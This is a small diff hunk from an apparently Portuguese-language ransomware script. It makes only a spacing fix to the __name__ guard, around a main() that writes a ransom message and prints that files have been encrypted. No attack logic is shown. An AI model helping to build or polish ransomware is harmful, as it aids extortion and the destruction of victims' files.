@@ -47,5 +47,5 @@ def main():
     criar_mensagem_resgate()
     print("Ransonware executado! Arquivos criptografados!!!")
 
-if __name__=="__main__":
+if __name__ == "__main__":
     main()
